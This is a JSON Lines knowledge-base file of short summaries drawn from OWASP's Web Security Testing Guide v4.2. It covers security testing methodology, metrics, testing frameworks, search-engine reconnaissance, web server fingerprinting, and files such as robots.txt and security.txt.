{"id": "kb-000128", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing procedures can be documented based on threat scenarios derived from use and misuse cases, providing a structured approach to security unit tests. Security unit tests can include both positive assertions (valid conditions) and negative assertions (error handling cases). Suitable unit testing frameworks for security tests include JUnit, NUnit, and CUnit."}
{"id": "kb-000129", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security engineers are responsible for the development of unit-level security test cases and ensuring detection of security issues in the code before integration into the application build. Threat scenarios for common vulnerabilities can be documented in a developer's security testing guide."}
{"id": "kb-000130", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Successfully implementing a fix for a coding defect can be verified through security test cases to ensure compliance with secure coding standards. Source code analysis and unit tests validate that code changes mitigate previously identified vulnerabilities."}
{"id": "kb-000131", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Automated secure code analysis can serve as automatic check-in gates in version control, preventing software artifacts with significant coding issues from being checked in."}
{"id": "kb-000132", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Integrated system tests validate the \"defense in depth\" concept, ensuring that security controls are effective at various layers of an application."}
{"id": "kb-000133", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security testing in integration and validation phases can simulate real attack scenarios, allowing testers to evaluate the practical risks posed by vulnerabilities. Security tests may include both manual techniques and penetration testing tools, often referred to as ethical hacking tests."}
{"id": "kb-000134", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Organizations may need to train software developers on ethical hacking techniques and provide resources to improve their security testing knowledge."}
{"id": "kb-000135", "section": null, "tags": ["SQLI", "XSS"], "source": "wstg-v4.2.pdf", "text": "Security test cases can validate exposure to vulnerabilities such as spoofing, information disclosures, buffer overflows, SQL injection, and XSS injection."}
{"id": "kb-000136", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Manual tests for security vulnerabilities may involve forcing applications into error states and analyzing the application behavior for exceptions or errors."}
{"id": "kb-000137", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Specialized testing techniques for deeper security testing include fault injection, fault propagation analysis, fuzz testing, and reverse engineering."}
{"id": "kb-000138", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "The user acceptance test (UAT) environment is beneficial for security testing due to its representative nature of the application's release configuration."}
{"id": "kb-000139", "section": null, "tags": ["AUTHZ", "CONF"], "source": "wstg-v4.2.pdf", "text": "Security configuration issues in web applications can lead to high risks if not addressed properly, including lack of proper privileges and invalid SSL certificates."}
{"id": "kb-000140", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Defining goals for security testing metrics is essential for effective risk analysis and management. Measurements like the total number of vulnerabilities found can quantify application security posture."}
{"id": "kb-000141", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Comparing application security posture against a baseline (e.g., previous security test results) can assess improvements in security processes."}
{"id": "kb-000142", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security testing metrics can be categorized similarly to software quality metrics, analyzing root causes and remediation efforts for defects. Security defects can stem from design errors (security flaws) or coding errors (security bugs). The cost and effort to fix both security and quality defects can be measured in terms of developer hours, tools, and overall expenditures."}
{"id": "kb-000143", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security test data differs from quality data in that it categorizes vulnerabilities by threat level, exposure, and potential impact to determine risks."}
{"id": "kb-000144", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Risk assessment metrics (high, medium, low) for vulnerabilities can influence risk management decisions, such as acceptance or mitigation of risks at the organizational level. Application size correlates with the number of security issues found, implying larger applications need more rigorous testing."}
{"id": "kb-000145", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Conducting security testing at various phases of the Software Development Life Cycle (SDLC) can demonstrate the capability of tests to detect and fix vulnerabilities early in the development process."}
{"id": "kb-000146", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Containment metrics evaluate the ability of security assessments to maintain application security during each SDLC phase and highlight the importance of addressing vulnerabilities early to reduce fixing costs."}
{"id": "kb-000147", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Specific goals for security metrics might include reducing vulnerabilities by a percentage or meeting deadlines for fixing identified security issues before major release stages."}
{"id": "kb-000148", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security test data can be absolute or comparative, with absolute data measuring vulnerabilities found in manual code reviews while comparative data involves metrics from different testing methods (e.g., manual reviews vs penetration tests). It is crucial to establish a baseline for acceptable and good security levels to assess the quality of security processes."}
{"id": "kb-000149", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security test data serves specific objectives, such as ensuring compliance with security regulations, managing security processes, identifying root causes of security issues, and conducting cost benefit analyses."}
{"id": "kb-000150", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Reporting of security test data must yield metrics that facilitate deep analysis of both the software's security and the efficacy of the testing processes."}
{"id": "kb-000151", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Key questions arising from security test data include: Are vulnerabilities minimized adequately for release? How does this product's security compare to similar ones? Are all test requirements satisfied? What are the principal root causes of security problems?"}
{"id": "kb-000152", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The effectiveness of various security activities in discovering vulnerabilities can be analyzed through test data, including the efficacy of white-box versus black-box testing. The data must clarify the incidence of security issues detected during secure code reviews compared to secure design reviews."}
{"id": "kb-000153", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Understanding testing processes and tools is essential for accurate interpretation of test results. A taxonomy of security tools can aid in selecting the best ones for particular vulnerabilities."}
{"id": "kb-000154", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Automated tools, while useful, cannot replace the insights provided by seasoned security testers; reliance solely on automated results can yield a false sense of security. Investment in skilled human resources and training is as critical as investment in security testing tools."}
{"id": "kb-000155", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Vulnerabilities can be characterized by their effects (number of vulnerabilities, risk ratings) or their causes (coding errors, architectural flaws, configuration issues)."}
{"id": "kb-000156", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "CVSS (Common Vulnerability Scoring System) is a widely-used metric for categorizing vulnerability severity, managed by FIRST (Forum of Incident Response and Security Teams)."}
{"id": "kb-000157", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Best practices for reporting security test data should include categorization of vulnerabilities by type and identifying the security threats associated with each vulnerability."}
{"id": "kb-000158", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security testing should include the root cause of each security issue, the testing technique used to identify the issues, the remediation for each vulnerability, and the severity rating (high, medium, low, or CVSS score)."}
{"id": "kb-000159", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Describing security threats allows understanding of why mitigation controls may be ineffective. Reporting the root cause assists in identifying what needs fixing. For white-box testing, the vulnerability often relates to specific offending source code."}
{"id": "kb-000160", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Guidance for software developers on re-testing vulnerabilities should involve white-box techniques, such as security code reviews, and include methods for validating exposure through black-box testing. Fixing vulnerabilities requires detailed instructions suitable for developers, including secure coding examples and configuration changes. Severity ratings contribute to calculating risk and help prioritize remediation efforts by considering factors like impact and exposure."}
{"id": "kb-000161", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Stakeholders in security testing include project managers, developers, information security officers, auditors, and chief information officers. Each stakeholder derives value from security test data relevant to their roles."}
{"id": "kb-000162", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Software developers utilize security test data to ensure secure and efficient coding practices and justify using security tools and training. Project managers use security test data to manage security testing activities, ensuring projects meet timelines and improve during tests."}
{"id": "kb-000163", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Information Security Officers (ISOs) can use metrics from security testing to prove it does not delay project delivery but rather decreases the workload needed to fix vulnerabilities post-launch. Compliance auditors rely on security metrics to assure that security standards are met through reviews in the organization."}
{"id": "kb-000164", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "CIOs and CISOs analyze security test data to inform decisions on budget allocations for security resources, focusing on ROI derived from assessing risk exposure against testing effectiveness and costs."}
{"id": "kb-000165", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The Web Security Testing Framework is a reference framework comprised of techniques and tasks appropriate at various phases of the software development life cycle (SDLC). Companies can develop their own testing frameworks based on the model provided, which is intended to be flexible rather than prescriptive."}
{"id": "kb-000166", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Building an end-to-end testing framework is crucial for assessing and improving software security: the economic impact of security issues can exceed USD $100,000."}
{"id": "kb-000167", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "It is advised that security testing should be integrated early in the development process rather than performing black-box security testing solely after development."}
{"id": "kb-000168", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The focus of security testing has been shifting from penetration testing (which is considered inefficient and overly dependent on tester skill) to ensuring security quality throughout the entire software lifecycle."}
{"id": "kb-000169", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The framework insists on testing at critical phases: Before development Begins, During definition and design, During development, During deployment, and During maintenance and operations."}
{"id": "kb-000170", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Before development begins, key activities include defining a secure SDLC and reviewing relevant policies and standards that guide the development team. Java secure coding standards are essential for applications developed in Java. Cryptography standards are important for applications that use cryptography. Documenting common and predictable issues reduces decision-making during the development process. Defining measurement and metrics criteria before development begins provides visibility into defects in both the process and product. Security requirements outline how an application functions from a security perspective and must be thoroughly tested. Testing requirements involves evaluating the assumptions made and identifying gaps."}
{"id": "kb-000171", "section": null, "tags": ["AUTHN", "AUTHZ", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Key areas to consider for requirements gaps include: user management, authentication, authorization, data confidentiality, integrity, accountability, session management, transport security, tiered system segregation, and compliance with legislation and standards. Designs and architectures should be documented and tested to ensure they meet security requirements. Identifying security flaws during the design phase is cost-effective and facilitates easier changes. Centralizing authorization decisions and validation processes can reduce redundancy and improve security. Unified Modeling Language (UML) models are helpful for understanding and confirming application functionality post-design."}
{"id": "kb-000172", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Threat modeling should involve developing realistic threat scenarios and analyzing design and architecture to ensure threats are mitigated, accepted, or assigned to third parties. During development, many design decisions are made that can affect security, especially when policies or standards are insufficient."}
{"id": "kb-000173", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A code walkthrough is a non-intrusive high-level review of the code where developers explain logic and flow, aimed at understanding rather than detailed code review."}
{"id": "kb-000174", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Static code reviews validate against checklists for security defects, focusing on business requirements and specific security guidelines like OWASP or regulatory standards."}
{"id": "kb-000175", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Static code reviews provide high return on resources invested compared to other security review methods, though they should be part of a comprehensive testing strategy. Penetration testing post-deployment serves as an additional check to catch any overlooked security issues before the application goes live. Configuration management testing reviews the deployment and security of the infrastructure to identify any vulnerable default settings."}
{"id": "kb-000176", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Phase 5 of the Web Security Testing Guide focuses on Maintenance and Operations, emphasizing the importance of managing application and infrastructure operational aspects. Operational Management Reviews must be systematically conducted to ensure ongoing security and operational effectiveness."}
{"id": "kb-000177", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Periodic Health Checks should be scheduled monthly or quarterly to identify and mitigate new security risks that may have surfaced since the last review."}
{"id": "kb-000178", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Change Verification is critical; every change introduced to the production environment, post-QA approval, must be checked to verify that security levels remain intact. This needs to be a part of the change management process. Integrating security checks into the SDLC helps create a robust framework for ongoing security assurance within the application lifecycle."}
{"id": "kb-000179", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The OWASP testing guides are essential resources for conducting technical security testing, tailored to different application types: web/cloud services, mobile applications, and IoT firmware."}
{"id": "kb-000180", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The OWASP Testing Guides include the OWASP Web Security Testing Guide, OWASP Mobile Security Testing Guide, and OWASP Firmware Security Testing Methodology, which provide frameworks for testing security in their respective areas."}
{"id": "kb-000181", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The Penetration Testing Execution Standard (PTES) outlines 7 phases of penetration testing, crucial for ensuring thoroughness in security assessments: 1) Pre-engagement Interactions, 2) Intelligence Gathering, 3) Threat Modeling, 4) Vulnerability Analysis, 5) Exploitation, 6) Post Exploitation, and 7) Reporting."}
{"id": "kb-000182", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "PTES Technical Guidelines offer practical recommendations for testing procedures as well as suggested security testing tools to enhance the effectiveness of penetration testing."}
{"id": "kb-000183", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The Payment Card Industry Data Security Standard (PCI DSS) Requirement 11.3 includes specific definitions and guidance on executing penetration testing within organizations handling payment card information."}
{"id": "kb-000184", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The PCI DSS (Payment Card Industry Data Security Standard) Requirement 11.3 outlines specific penetration testing requirements that must be adhered to, including coverage for Cardholder Data Environment (CDE) and critical systems, as well as the necessity for both external and internal testing."}
{"id": "kb-000185", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Penetration Testing Framework (PTF) offers a hands-on guide that encompasses various penetration testing methodologies and categorizes specific security testing tools relevant to each type of test."}
{"id": "kb-000186", "section": null, "tags": ["AUTHN", "INFO"], "source": "wstg-v4.2.pdf", "text": "Key areas of penetration testing highlighted in the PTF include Network Footprinting (Reconnaissance), Discovery & Probing, Enumeration, Password Cracking, and Vulnerability Assessment, which are essential for a comprehensive security assessment."}
{"id": "kb-000187", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Specific testing categories also include AS/400 Auditing, Bluetooth Specific Testing, Cisco Specific Testing, Citrix Specific Testing, Network Backbone examination, Server Specific Tests, VoIP Security review, Wireless Penetration testing, and Physical Security assessments."}
{"id": "kb-000188", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The Technical Guide to Information Security Testing and Assessment (NIST 800-115) includes several assessment techniques such as Review Techniques, Target Identification and Analysis Techniques, Target Vulnerability Validation Techniques, Security Assessment Planning, Security Assessment Execution, and Post-Testing Activities."}
{"id": "kb-000189", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The Open Source Security Testing Methodology Manual (OSSTMM) is a comprehensive methodology designed to assess various aspects of operational security."}
{"id": "kb-000190", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "OSSTMM evaluates multiple security domains including physical security, workflow security, human interaction security, wireless and telecommunication security, data network security, and compliance to standards."}
{"id": "kb-000191", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "It serves as a supporting reference for ISO 27001, which focuses on information security management systems, rather than a technical guide for penetration testing. Key sections of OSSTMM include: - Security Analysis - Operational Security Metrics - Trust Analysis - Workflow - Human Security Testing - Physical Security Testing - Wireless Security Testing - Telecommunications Security Testing - Data Networks Security Testing - Compliance Regulations - Reporting with the STAR (Security Test Audit Report)"}
{"id": "kb-000192", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Web application security testing is a method of evaluating the security of a web application by analyzing its weaknesses, technical flaws, or vulnerabilities. It involves validating and verifying the effectiveness of security controls."}
{"id": "kb-000193", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A vulnerability is defined as a flaw or weakness in a system's design, implementation, operation, or management that could be exploited to compromise the system's security objectives."}
{"id": "kb-000194", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A threat is anything that may harm the assets owned by an application, such as malicious external attackers, internal users, or system instabilities, by exploiting vulnerabilities. A test is an action taken to demonstrate that an application meets the security requirements of its stakeholders."}
{"id": "kb-000195", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The OWASP approach to writing security testing guidelines is open and collaborative, allowing every security expert to contribute their experiences. This results in a more inclusive, rigorous, and quality-controlled methodology for security testing."}
{"id": "kb-000196", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The OWASP Testing Methodology is based on the black box approach, where the tester has little or no prior information about the application being tested. This emphasizes the importance of uncovering vulnerabilities through active testing rather than relying on known information. Testing can be categorized as passive or active."}
{"id": "kb-000197", "section": null, "tags": ["HTTP", "INFO"], "source": "wstg-v4.2.pdf", "text": "Passive testing involves understanding the application's logic and functionality as a user, often utilizing tools for information gathering such as HTTP proxies to observe requests and responses."}
{"id": "kb-000198", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "At the end of passive testing, a tester should have an understanding of all access points and functionality, including HTTP headers, parameters, cookies, APIs, and technology patterns."}
{"id": "kb-000199", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Example of passive testing: A URL like 'https://www.example.com/login/auth_form' can indicate an authentication form requiring a username and password."}
{"id": "kb-000200", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "During passive testing, the tester identifies parameters such as 'https://www.example.com/appx?a=1&b=1', where 'a' and 'b' are input points for testing. Keeping track of the directory or call tree of the application and all access points is useful during active testing."}
{"id": "kb-000201", "section": null, "tags": ["API", "AUTHN", "AUTHZ", "BUSINESS", "CLIENT", "CONF", "HTTP", "INFO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Active testing employs various methodologies to actively probe the application for vulnerabilities, categorized into 12 areas: Information Gathering, Configuration and Deployment Management Testing, Identity Management Testing, Authentication Testing, Authorization Testing, Session Management Testing, Input Validation Testing, Error Handling, Cryptography, Business Logic Testing, Client-side Testing, and API Testing. Search engines utilize computer programs called robots to crawl and index web content, fetching data from billions of web pages."}
{"id": "kb-000202", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The file 'robots.txt' allows website owners to specify which pages search engines should not index, thereby preventing sensitive information from being publicly accessible."}
{"id": "kb-000203", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "Direct methods of reconnaissance involve searching indexes and cached content, while indirect methods include exploring forums and tendering websites for sensitive design information."}
{"id": "kb-000204", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Indexing is performed based on tags and attributes like <TITLE>; outdated robots.txt files or missing meta tags can lead to unintended exposure of sensitive content."}
{"id": "kb-000205", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Test objectives in web security include identifying sensitive design and configuration that may be exposed via search engines directly or through third-party services."}
{"id": "kb-000206", "section": null, "tags": ["AUTHN", "CONF"], "source": "wstg-v4.2.pdf", "text": "When testing, it is important to search for sensitive information such as network diagrams, logon procedures, usernames, passwords, cloud service configurations, and error messages."}
{"id": "kb-000207", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Various search engines should be used for testing, as they may return different results based on crawling frequency and their respective algorithms. Examples include Baidu and Bing. Common Crawl is an open repository of web crawl data that can be accessed and analyzed by anyone. DuckDuckGo is a privacy-focused search engine that compiles results from various sources and supports search syntax."}
{"id": "kb-000208", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Google is the world’s most popular search engine, which uses a ranking system to return the most relevant results, and it supports search operators. Internet Archive Wayback Machine aims to build a digital library of Internet sites and other cultural artifacts in digital form."}
{"id": "kb-000209", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Startpage is a search engine that uses Google’s results while ensuring user privacy by not collecting personal information through trackers and logs. Shodan allows users to search for Internet-connected devices and services, offering both free and paid subscription plans. Search operators enhance the capabilities of search queries, allowing for more specific results. Examples include: - site: to limit searches to a specific domain. - inurl: to return results including a keyword in the URL. - intitle: to return results having a keyword in the page title. - intext: or inbody: to search for a keyword in the page body. - filetype: to match only a specific file type like png or php. The search query 'site:owasp.org' would be used to find web content indexed by search engines for the domain owasp.org."}
{"id": "kb-000210", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To view previously indexed content, use the 'cache:' operator, which is helpful for accessing content that may have changed or is no longer available. The syntax to view a cached version of a website (e.g., owasp.org) is 'cache:owasp.org'. Google hacking, also known as Dorking, involves using search operators creatively to discover sensitive files and information. Operators can be chained together to uncover specific types of data that might be sensitive or vulnerable."}
{"id": "kb-000211", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The Google Hacking Database serves as a resource for various search techniques, known as 'dorks', categorized into areas like footholds, usernames, sensitive directories, web server detection, vulnerable files, vulnerable servers, error messages, juicy info, passwords, and sensitive online shopping information."}
{"id": "kb-000212", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Bishop Fox’s Google Hacking Diggity Project provides resources for databases that can be utilized with various search engines, including Bing and Shodan. When posting design and configuration information online, it is crucial to assess its sensitivity to prevent potential security risks."}
{"id": "kb-000213", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Regularly reviewing existing design and configuration information that is publicly accessible can be an important step in maintaining web security."}
{"id": "kb-000214", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "Web server fingerprinting involves identifying the type and version of web server running on a target, which is essential for detecting potential vulnerabilities."}
{"id": "kb-000215", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Knowing the specific version of a web server helps security testers assess its vulnerability to attacks, particularly older versions that may lack security patches."}
{"id": "kb-000216", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "Key techniques for web server fingerprinting include banner grabbing, malformed requests, and using automated tools to scan for server specifics."}
{"id": "kb-000217", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Banner grabbing is a technique where an HTTP request is sent to a web server, and the response header is analyzed for information about the server."}
{"id": "kb-000218", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The response to a banner grab may include details like the server type and version, and tools like telnet and openssl can be used in this process."}
{"id": "kb-000219", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Example of banner grabbing response from an Apache server includes headers such as 'Server: Apache/2.4.41 (Unix)' and for nginx, 'Server: nginx/1.17.3'. HTTP responses can reveal server type and version, which can be a security risk if not obfuscated. Example of a lighttpd response: 'HTTP/1.0 200 OK' with headers revealing the server's details. Applications can obfuscate server information by modifying the headers to something like 'Server: Website.com'. Despite obfuscation, testers may deduce server types based on the order of header fields, which can hint at the type of web server used. Typical field ordering in responses can aid in identifying server types, such as in Apache and nginx examples provided. Testers can send malformed requests to provoke default error responses that may indicate the server type, helping in server identification."}
{"id": "kb-000220", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Different web servers provide varying responses to client requests that result in errors, which can help identify the server type. For instance, an Apache server responds to a non-existent method request with a '400 Bad Request' error, while nginx provides a '404 Not Found' error, and lighttpd also gives a '400 Bad Request' response."}
{"id": "kb-000221", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "The example responses highlight the importance of error codes in web security testing and server identification. The distinction between '400 Bad Request' and '404 Not Found' reveals how servers treat unrecognized requests differently, which can be used as a method for fingerprinting web servers."}
{"id": "kb-000222", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "The content types and structure of each response also vary, demonstrating that the fundamental elements of a server's response can indicate its type, even when header fields are kept ambiguous. This phenomenon underscores the necessity for security professionals to analyze default error pages as a means of server identification."}
{"id": "kb-000223", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "Automated scanning tools can perform web server fingerprinting, which is the process of identifying the type of web server based on its response characteristics."}
{"id": "kb-000224", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Automated tools compare responses from web servers faster than manual testing and utilize databases of known responses for server identification, leading to more accurate results."}
{"id": "kb-000225", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "Commonly used scanning tools that include web server fingerprinting functionality are: Netcraft (an online scanning tool), Nikto (an open-source command-line tool), and Nmap (an open-source command-line tool with a GUI, Zenmap)."}
{"id": "kb-000226", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Exposed server information, while not a vulnerability in itself, can help attackers exploit other vulnerabilities, especially those that are version-specific."}
{"id": "kb-000227", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Recommended remediation actions for exposed server information include obscuring server information in HTTP headers (e.g., using Apache's mod_headers), employing a hardened reverse proxy server for additional security, and keeping web servers updated with the latest software and security patches."}
{"id": "kb-000228", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The section focuses on testing metadata files for information leakage regarding a web application's paths and functionalities, which is crucial for security testing."}
{"id": "kb-000229", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The test objectives emphasize identifying hidden or obfuscated paths and extracting additional information that can lead to a better understanding of the application and its attack surface."}
{"id": "kb-000230", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Tools such as wget and curl can be used to perform actions similar to what can be done by Dynamic Application Security Testing (DAST) tools like ZAP and Burp Suite, which also include functionality for parsing these resources."}
{"id": "kb-000231", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The Robots Exclusion Protocol, defined in the robots.txt file, guides web spiders, robots, or crawlers by indicating which parts of a site they may or may not access."}
{"id": "kb-000232", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example of a robots.txt file shows directives like 'Disallow' and 'Allow', which determine whether specific directories can be accessed by different User-Agents (like Googlebot or bingbot)."}
{"id": "kb-000233", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The 'User-Agent' directive in the robots.txt file specifies which crawler it applies to, while the 'Disallow' directive indicates which resources should not be accessed by crawlers."}
{"id": "kb-000234", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Web spiders, robots, or crawlers can ignore the Disallow directives in a robots.txt file, meaning it should not be relied upon to restrict web content access by third parties. The robots.txt file is accessed via the web root directory; for example: $ curl -O -Ss http://www.google.com/robots.txt"}
{"id": "kb-000235", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Webmasters can analyze their robots.txt using Google Webmaster Tools, which involves signing in, entering a site URL, and following on-screen instructions. <META> tags in HTML documents provide instructions for robots and should be uniform across a website, particularly for deep links."}
{"id": "kb-000236", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The Robots Exclusion Protocol defaults to INDEX,FOLLOW when there is no <META NAME=\"ROBOTS\"> entry, with alternatives being NOINDEX and NOFOLLOW. Testers can search for <META NAME=\"ROBOTS\"> to find exclusions and compare them with the robots.txt directives."}
{"id": "kb-000237", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Organizations may embed META tags in HTML for supporting different technologies, useful for testers in identifying features and testing paths, including Open Graph and Twitter card data."}
{"id": "kb-000238", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A sitemap is a file that provides information about the pages, videos, and other files offered by a site or application, as well as the relationships between them. This is useful for both search engines and testers to explore websites more completely."}
{"id": "kb-000239", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testers can utilize sitemap.xml files to gain insights into a site or application’s structure, aiding in more thorough exploration during security testing."}
{"id": "kb-000240", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In the excerpt from Google's primary sitemap, it lists several resources, indicating how different URLs are organized, which helps in navigating and exploring a large site like Google."}
{"id": "kb-000241", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The command line example provided uses 'wget' to retrieve the sitemap from Google, demonstrating how interactive tools can be used for web testing and gathering information."}
{"id": "kb-000242", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security TXT is a proposed standard for websites to outline their security policies and provide relevant contact details. This resource can be invaluable during testing for several reasons: it may help identify additional resources for analysis, locate open source intelligence, and find information on bug bounties and social engineering tactics."}
{"id": "kb-000243", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Security.txt is a file that can be located in the root of the web server or in the .well-known/ directory, used for security-related contact information and guidelines for web security researchers. Example URLs include https://example.com/security.txt and https://example.com/.well-known/security.txt."}
{"id": "kb-000244", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example of a security.txt file from LinkedIn includes sections for contact information and policy links, indicating compliance with IETF draft standards."}
{"id": "kb-000245", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Humans.txt is an initiative designed to provide information about the people contributing to a website, often found in a file named humans.txt. It typically details team members and can provide career and job information."}
